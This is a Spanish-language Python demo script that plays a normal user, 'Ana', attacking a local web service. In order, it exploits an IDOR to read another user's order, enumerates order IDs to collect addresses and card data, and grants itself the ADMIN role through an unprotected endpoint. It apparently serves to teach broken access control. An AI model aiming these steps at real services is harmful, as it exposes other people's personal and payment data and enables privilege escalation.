"""
Script de ataque para la demo. Simula a Ana (usuario normal) atacando el servicio.
Uso: python attack.py   (con el servicio corriendo en localhost:8000)
"""
import json
import time

import requests

BASE = "http://localhost:8000"
PAUSA = 1.5


def titulo(texto):
    print(f"\n{'=' * 60}\n{texto}\n{'=' * 60}")
    time.sleep(PAUSA)


def mostrar(resp):
    estado = "OK" if resp.ok else "BLOQUEADO"
    print(f"[{resp.status_code}] {estado}")
    print(json.dumps(resp.json(), indent=2, ensure_ascii=False))


# --- Paso 0: Ana inicia sesión (autenticación legítima) ----------------------
titulo("PASO 0: Ana (usuario normal) inicia sesión")
login = requests.post(f"{BASE}/login", json={"username": "ana", "password": "ana123"})
token = login.json()["token"]
headers = {"Authorization": f"Bearer {token}"}
print("Token obtenido. Ana es la dueña del pedido 5001.")

# --- Paso 1: acceso legítimo -------------------------------------------------
titulo("PASO 1: Ana consulta SU pedido (5001)")
mostrar(requests.get(f"{BASE}/api/orders/5001", headers=headers))

# --- Paso 2: IDOR ------------------------------------------------------------
titulo("PASO 2: Ana cambia el ID en la URL -> pedido 5002 (de Beto)")
mostrar(requests.get(f"{BASE}/api/orders/5002", headers=headers))

# --- Paso 3: enumeración masiva ---------------------------------------------
titulo("PASO 3: Ana recorre IDs 5000-5010 con un bucle")
for order_id in range(5000, 5011):
    r = requests.get(f"{BASE}/api/orders/{order_id}", headers=headers)
    if r.status_code == 200:
        o = r.json()
        print(f"  Pedido {order_id}: dueño={o['owner_id']} | {o['address']} | tarjeta {o['card']}")
    elif r.status_code == 403:
        print(f"  Pedido {order_id}: 403 (bloqueado)")

# --- Paso 4: escalada de privilegios ----------------------------------------
titulo("PASO 4: Ana se auto-asigna el rol ADMIN")
mostrar(requests.put(f"{BASE}/api/admin/users/101/role", headers=headers, json={"role": "ADMIN"}))

titulo("PASO 5: Ana lista TODOS los usuarios del sistema")
mostrar(requests.get(f"{BASE}/api/admin/users", headers=headers))
